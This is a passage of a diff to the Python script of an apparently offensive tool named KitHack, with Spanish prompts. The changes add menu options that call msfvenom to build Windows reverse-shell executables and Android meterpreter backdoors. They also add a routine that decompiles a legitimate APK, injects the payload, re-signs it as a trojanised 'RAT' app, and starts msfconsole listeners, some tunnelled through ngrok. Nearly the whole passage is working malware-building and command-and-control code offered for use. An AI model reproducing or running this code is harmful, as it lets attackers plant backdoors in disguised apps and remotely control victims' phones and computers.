 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+					banner(), menu(), options()	
+
+			elif pay == 13:
+				os.system('python lib/network.py')
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
+				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+				time.sleep(4)
+				os.system('service postgresql start && msfvenom -p windows/powershell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
+				location = os.getcwd()
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+						banner(), menu(), options()
+					else:
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/powershell_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+				else:
+					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+					time.sleep(3)
+					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+					banner(), menu(), options()	
+
+			elif pay == 14:
+				os.system('python lib/network.py')
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
+				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+				time.sleep(4)
+				os.system('service postgresql start && msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
+				location = os.getcwd()
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+						banner(), menu(), options()	
+					else:
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/shell_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+				else:
+					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+					time.sleep(3)
+					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			else:
@@ -1423,16 +1714,18 @@ def options():
 
 		elif sys == 3:
 			print '{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN)
-			print '{0}[01]{1} android/meterpreter/reverse_http'.format(WHITE, YELLOW)
-			print '{0}[02]{1} android/meterpreter/reverse_https'.format(WHITE, YELLOW)
-			print '{0}[03]{1} android/meterpreter/reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[04]{1} android/shell/reverse_http'.format(WHITE, YELLOW)
-			print '{0}[05]{1} android/shell/reverse_https'.format(WHITE, YELLOW)
-			print '{0}[06]{1} android/shell/reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[01]{1} android/meterpreter_reverse_http'.format(WHITE, YELLOW)
+			print '{0}[02]{1} android/meterpreter_reverse_https'.format(WHITE, YELLOW)
+			print '{0}[03]{1} android/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[04]{1} android/meterpreter/reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[05]{1} android/shell/reverse_http'.format(WHITE, YELLOW)
+			print '{0}[06]{1} android/shell/reverse_https'.format(WHITE, YELLOW)
+			print '{0}[07]{1} android/shell/reverse_tcp'.format(WHITE, YELLOW)
 
 			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
 
 			if pay == 1:
+				print '{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN)
 				print '{0}[01]{1} APK MSF'.format(WHITE, YELLOW)
 				print '{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW)
 				
@@ -1440,59 +1733,142 @@ def options():
 				
 				if a == 1:
 					os.system('python lib/network.py')
-					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					mainout = os.path.splitext(OUT)[0]
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
-					os.system('service postgresql start && msfvenom -p android/meterpreter/reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
+					os.system('service postgresql start && msfvenom -p android/meterpreter_reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
 					location = os.getcwd()
-					print("\033[1;32m")
-					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:
-						print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
-						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-							os.system('service postgresql stop && clear')
+					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
+						print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+						if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_http; exploit\'"'.format(LHOST, LPORT))
-							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-							os.system('service postgresql stop && clear')
-							banner(), menu(), options()	
+							while LHOST != "0.tcp.ngrok.io":
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
 					else:
-						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 						time.sleep(3)
 						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()						
 				
 				elif a == 2:
-					os.system('python lib/network.py')
-					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
-					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					Tk().withdraw()
-					APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
-					print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
-					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
-					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
-					time.sleep(4)
-					os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter/reverse_http LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
-					location = os.getcwd()
-					print("\033[1;32m")
-					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
-		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
-						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-							os.system('service postgresql stop && clear')
-							banner(), menu(), options()	
+					print '{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN)
+					print '{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW)
+					print '{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW)
+
+					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+
+					if m == 1:
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter_reverse_http LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
+						location = os.getcwd()
+						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_http; exploit\'"'.format(LHOST, LPORT))					
-							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-							os.system('service postgresql stop && clear')
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
+
+					elif m == 2:
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system("service postgresql start && msfvenom -p android/meterpreter_reverse_http LPORT={0} LHOST={1} R > output/payload.apk".format(LPORT, LHOST))
+						location = os.getcwd()
+						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
+						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)				
+						os.system('bash lib/apkf.sh')
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/original -o output/kithack.apk')
+						if os.path.isfile('output/kithack.apk'):
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+
 					else:
-						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+						print("\n{}[X] OPCION INVALIDA\n".format(RED))
 						time.sleep(3)
 						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
+						os.system('clear')
 						banner(), menu(), options()	
 
 				else:
@@ -1502,7 +1878,9 @@ def options():
 					os.system('clear')
 					banner(), menu(), options()	
 
+
 			elif pay == 2:
+				print '{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN)
 				print '{0}[01]{1} APK MSF'.format(WHITE, YELLOW)
 				print '{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW)
 				
@@ -1510,69 +1888,153 @@ def options():
 				
 				if a == 1:
 					os.system('python lib/network.py')
-					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					mainout = os.path.splitext(OUT)[0]
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
-					os.system('service postgresql start && msfvenom -p android/meterpreter/reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
+					os.system('service postgresql start && msfvenom -p android/meterpreter_reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
 					location = os.getcwd()
-					print("\033[1;32m")
-					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:
-						print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
-						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-							os.system('service postgresql stop && clear')
+					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
+						print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+						if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_https; exploit\'"'.format(LHOST, LPORT))
-							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-							os.system('service postgresql stop && clear')
-							banner(), menu(), options()	
+							while LHOST != "0.tcp.ngrok.io":
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
 					else:
-						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 						time.sleep(3)
 						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 				
 				elif a == 2:
-					os.system('python lib/network.py')
-					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
-					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					Tk().withdraw()
-					APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
-					print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
-					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
-					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
-					time.sleep(4)
-					os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter/reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
-					location = os.getcwd()
-					print("\033[1;32m")
-					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
-		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
-						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-							os.system('service postgresql stop && clear')
-							banner(), menu(), options()	
+					print '{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN)
+					print '{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW)
+					print '{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW)
+
+					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+
+					if m == 1:					
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter_reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
+						location = os.getcwd()
+						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()							
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_https; exploit\'"'.format(LHOST, LPORT))					
-							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-							os.system('service postgresql stop && clear')
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
+				
+					elif m == 2:
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system("service postgresql start && msfvenom -p android/meterpreter_reverse_https LPORT={0} LHOST={1} R > output/payload.apk".format(LPORT, LHOST))
+						location = os.getcwd()
+						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
+						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)				
+						os.system('bash lib/apkf.sh')
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/original -o output/kithack.apk')
+						if os.path.isfile('output/kithack.apk'):							
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
